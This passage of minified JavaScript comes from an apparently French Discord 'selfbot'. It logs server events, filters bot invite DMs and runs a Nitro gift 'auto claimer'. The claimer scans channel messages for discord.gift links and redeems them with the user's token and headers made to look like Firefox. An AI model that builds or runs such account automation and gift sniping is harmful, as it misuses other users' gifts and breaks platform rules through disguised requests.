                        console.log(ay.hex(u)('Log:')), console.log(ay.hex(x)('--------------------------')), console.log(ay.hex(y)('Vous avez rejoint le serveur ' + cg.name));
                      }), aN.on('message', cg => {
                        let ch = cg;
                        var ci = cg.content.substring(ab.length).split(' '),
                          cj = cg.mentions.users.first();
                        if (cg.channel.type === 'dm') {
                          if (ch.author.bot) {
                            if (cg.content.includes('discord.gg')) {
                              let ck = cg.author;
                              ck.send('/! Anti mp').then(cl => {
                                cl.delete();
                              }), console.log(ay.hex(u)('Log:')), console.log(ay.hex(x)('--------------------------')), console.log('[', ay.hex(u)('/!/ Attention'), ']', ay.hex(y)('le bot ' + cg.author.username + ' vient de vous envoyer une invatation suspecte ' + cg.content));
                            }
                          }
                        }
                      }), aN.on('channelCreate', cg => {
                        let ch = cg.guild;
                        if (!ch) return console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUne conversation a été crée :\nId de la conversation : ' + cg.id));
                        if (cg.type == 'text') return console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn channel a été crée :\nNom du channel : ' + cg.name + '\nId du channel : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                        if (cg.type == 'voice') return console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn channel vocal a été crée :\nNom du channel : ' + cg.name + '\nId du channel : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                      }), aN.on('channelDelete', cg => {
                        var ch = cg.guild;
                        if (!ch) return console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUne conversation a été supprimé :\nId de la conversation : ' + cg.id));
                        if (cg.type == 'text') return console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn channel a été supprimé :\nNom du channel : ' + cg.name + '\nId du channel : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                        if (cg.type == 'voice') return console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn channel vocal a été supprimé :\nNom du channel : ' + cg.name + '\nId du channel : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                      }), aN.on('webhookUpdate', cg => {
                        console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn Webhook a été modifié :\nNom du webhook : ' + cg.name + '\nId du webhook : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                      }), aN.on('roleCreate', cg => {
                        console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn role à été crée :\nNom du role : ' + cg.name + '\nId du role : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                      }), aN.on('roleDelete', cg => {
                        console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn role à été supprimé:\nNom du role : ' + cg.name + '\nId du role : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                      }), aN.on('roleUpdate', (cg, ch) => {
                        console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn role à été modifié :\nAvant : ' + cg.name + '\nApres : ' + ch.name + '\nSur le serveur : ' + ch.guild.name));
                      }), aN.on('emojiCreate', cg => {
                        console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn emoji à été crée :\nNom de l\'emoji : ' + cg.name + '\nId de l\'emoji : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                        ;
                      }), aN.on('emojiDelete', cg => {
                        console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn emoji à été supprimé :\nNom de l\'emoji : ' + cg.name + '\nId de l\'emoji : ' + cg.id + '\nSur le serveur : ' + cg.guild.name));
                        ;
                      }), aN.on('emojiUpdate', (cg, ch) => {
                        console.log('[', ay.hex(u)('LOGS'), ']', ay.hex(y)('\nUn emoji à été modifié :\nNom de l\'emoji avant : ' + cg.name + '\nNom de l\'emoji apres : ' + ch.name + '\nSur le serveur : ' + ch.guild.name));
                        ;
                      }), aN.on('message', cg => {
                        if (ah.includes('on')) {
                          let ck = [];
                          cf(cg.content, cl => {
                            if (!cl) return;
                            if (!ck.includes(cl)) ck.push(cl);
                          });
                          if (ck.length == 0) return;
                          ck.forEach(cl => {
                            var co = {};
                            co.channel_id = cg.channel.id, aC('https://canary.discordapp.com/api/v6/entitlements/gift-codes/' + cl.split('/').pop() + '/redeem', {
                              'method': 'POST',
                              'headers': {
                                'Accept': '*/*',
                                'Accept-Encoding': 'gzip, deflate, br',
                                'Accept-Language': 'en-US',
                                'Authorization': a9,
                                'Connection': 'keep-alive',
                                'Content-Length': JSON.stringify(co).length,
                                'Content-Type': 'application/json',
                                'Host': 'canary.discordapp.com',
                                'Referer': 'https://canary.discordapp.com/channels/' + cg.channel.id + '/' + cg.id,
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                                'X-super-properties': Buffer.from(JSON.stringify({
                                  'os': 'Windows',
                                  'browser': 'Firefox',
                                  'device': '',
                                  'browser_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                                  'browser_version': '66.0',
                                  'os_version': '10',
                                  'referrer': '',
                                  'referring_domain': '',
                                  'referrer_current': '',
                                  'referring_domain_current': '',
                                  'release_channel': 'canary',
                                  'client_build_number': 0x928f,
                                  'client_event_source': null
                                }), 'utf-8').toString('base64')
                              },
                              'body': JSON.stringify({
                                'channel_id': cg.channel.id
                              })
                            }).then(cp => {
                              if (cp.status == 400 || cp.status == 404) return console.log(ay.hex(u)('code invalide :  ' + cl));
                              cp.json().then(cs => {
                                console.log(cs), console.log(ay.hex(y)('Un nouveau nitro ou jeux à sûrement été ajouté à tes crédits.'));
                              });
                            }).catch(console.error);
                          });
                        }
                      });
                      function cf(cg, ch) {
                        let ci = cg.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);
                        if (ci) return ch(ci[0]), cf(cg.slice(ci.index + ci[0].length), ch);else ch(null);
                      }
                    }
                  }).catch(c5 => {
                    setTimeout(() => {
                      console.log(c5);
                    }, 1500), bz = false;
                  });
                });
              });
            });
          });
        });
      }
    });
    if (!S.existsSync(__dirname + '/Data/')) {
      console.clear();
      console.error('[31mIl manque le dossier Data[0m');
      console.log('[33mCréation du dossier manquant en cours...[0m');
      S.mkdirSync(__dirname + '/Data/');
      console.log('[32mLe dossier Data à créé avec succes, vous pouvez relancer le selfbot.[0m');
      process.exit();
    } else {
      if (!S.existsSync(f + '/commandes/')) {
        console.clear();
        console.error('[31mIl manque le dossier commandes[0m' + f);
        console.log('[33mCréation du dossier manquant en cours...[0m');
        S.mkdirSync(f + '/commandes/');
        console.log('[32mLe dossier commandes à créé avec succes, vous pouvez relancer le selfbot.[0m');
        process.exit();
      } else {
        if (!S.existsSync(f + '/commandes/exemple.js')) {
          console.clear();
          console.error('[31mIl manque le fichier exemple.js[0m');
          console.log('[33mCréation du fichier manquant en cours...[0m');
          S.writeFileSync(f + '/commandes/exemple.js', '\n  const Discord = require("discord.js")\n  //ici on importe les modules (pour ma part j\'ai mis discord.js pour les embeds) vous pouvez en mettre d\'autres disponible dans le fichier package.json\n  \n  \n  module.exports.run = async (client, message, argument) => {\n    //ici on exporte client message et argument\n  \n  \n    const embed = new Discord.RichEmbed()//constante embed (new discord.RicheEmbed())\n    .setTitle("Exemple titre")//Titre\n    .setDescription("Exemple description")//description\n    .addField("Exemple Field", "Exemple field")//Field\n    .setColor("random")//la couleurs vous pouvez mettre une couleur html,hex,rgb,hsl\n    .setImage("https://media1.tenor.com/images/bc7f6147063085d89b403cb96de6f883/tenor.gif?itemid=4973579")//vous mettez le lien d\'une image ou son emplacement\n    .setFooter("exemple footer", client.user.AvatarURL)//le footer \n    message.edit(embed)//edit le message par la constante embed\n  \n  \n  }\n  \n  //ici c\'est pour expotrer le nom de la commande (ici c\'est exemple)\n  module.exports.punchnox = {\n    name: "exemple"\n  }');
          console.log('[32mLe fichier exemple.js à créé avec succes, vous pouvez relancer le selfbot.[0m');
          process.exit();
        } else {
          if (!S.existsSync(f + '/plugins/')) {
            console.clear();
            console.error('[31mIl manque le dossier plugins[0m');
            console.log('[33mCréation du dossier manquant en cours...[0m');
            S.mkdirSync(f + '/plugins/');
            console.log('[32mLe dossier plugins à créé avec succes, vous pouvez relancer le selfbot.[0m');
            process.exit();
          } else {
            if (!S.existsSync(f + '/config.js')) console.clear(), console.error('[31mIl manque le fichier config.js[0m'), console.log('[33mCréation du fichier manquant en cours...[0m'), S.writeFileSync(f + '/config.js', '\n  const token          = ""; //tu met ton token entre les guillemets\n  const prefix         = ""; //tu met ton prefix entre les guillemets\n  const image          = ""; //tu met le lien de ton image entre les guillemets\n  const color          = ""; //tu met ton la couleur (EXEMPLE RANDOM, RED, BLACK) ou un code couleur html comme #0CDF7C, #0F0000 dispo sur ce site ou autre https: //htmlcolorcodes.com/fr/\n  const twitch         = ""; //tu met ton lien twitch ici \n  const nsfw           = ""; //tu met on ou off (on pour activer le nsfw et off pour le désactiver)\n  const nitro_claimer  = ""; //tu met on ou off (on pour activer l\'auto claimer et off pour le désactiver)\n  const multi_status   = ["", "", ""]; //tu met le text que tu veut avoir en multi stream tu peut en mettre plus que 3 stv mais il faut bien mettre une virgule \n  const console        = ""; //ici c\'est l\'intencité des couleurs de la console 1 c\'est des couleurs pale 2 des couleurs vives et 3 des couleurs sombres\n  const premium        = "" //Mettez votre clée premium ici pas obligé\n  const team = "" //Si vous faites parti d\'une team en alliance avec le punchnox-project vous pouvez mettre votre key ici\n  \n  ////CONFIG RPC\n  const application_id = ""; //tu met l\'id de ton bot pour les rpc\n  const imagerpc       = ""; //tu met le nom de ton image rpc\n  const title          = ""; //tu met le titre rpc\n  const details        = ""; //tu met le detail rpc\n  const state          = ""; //tu met la state rpc\n  const largetext      = ""; //tu met le text de ta grande image\n  const smalltext      = ""; //tu met le text de ta petite image\n  const sizeplayer     = ""; //tu met le nombre de joueurs actuel (1 jusque à 999999999999)\n  const sizeplayermax  = "" //tu met le nombre de joueurs maximum (1 jusque à 999999999999)\n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \n  //ne pas toucher\n  module.exports = { //ne pas toucher\n    token, //ne pas toucher\n    prefix, //ne pas toucher\n    image, //ne pas toucher\n    color, //ne pas toucher\n    twitch, //ne pas toucher\n    team, //ne pas toucher\n    nsfw, //ne pas toucher\n    premium, //ne pas toucher\n    nitro_claimer, //ne pas toucher\n    multi_status, //ne pas toucher\n    console, //ne pas toucher\n    application_id, //ne pas toucher\n    imagerpc, //ne pas toucher\n    title, //ne pas toucher\n    details, //ne pas toucher\n    state, //ne pas toucher\n    largetext, //ne pas toucher\n    smalltext, //ne pas toucher\n    sizeplayer, //ne pas toucher\n    sizeplayermax //ne pas toucher\n  }\n  ', function (a1) {
              console.error(a1);
            }), console.log('[32mLe fichier config.js à créé avec succes, vous pouvez relancer le selfbot.[0m'), process.exit();else {
              if (!S.existsSync(__dirname + '/Data/codes.json')) console.clear(), console.error('[31mIl manque le fichier codes.json[0m'), console.log('[33mCréation du fichier manquant en cours...[0m'), S.writeFileSync(__dirname + '/Data/codes.json', '[]', function (a1) {
                console.error(a1);
              }), console.log('[32mLe fichier codes.json à créé avec succes, vous pouvez relancer le selfbot.[0m'), process.exit();else {
                if (!S.existsSync(__dirname + '/Data/backups.json')) {
                  console.error('[31mIl manque le fichier backups.json[0m');
                  console.log('[33mCréation du fichier manquant en cours...[0m');
                  S.writeFileSync(__dirname + '/Data/backups.json', '{}', function (a2) {
                    console.error(a2);
                  });
                  console.log('[32mLe fichier backups.json à créé avec succes, vous pouvez relancer le selfbot.[0m');
                  process.exit();
                } else !S.existsSync(__dirname + '/Data/statut.json') && (console.error('[31mIl manque le fichier status.json[0m'), console.log('[33mCréation du fichier manquant en cours...[0m'), S.writeFileSync(__dirname + '/Data/statut.json', '{}', function (a2) {
                  console.error(a2);
                }), console.log('[32mLe fichier status.json à créé avec succes, vous pouvez relancer le selfbot.[0m'), process.exit());
              }
            }
          }
        }
      }
    }
  } catch (a2) {
    n();
  }
}
var en = {};
en.start = em, module.exports = en;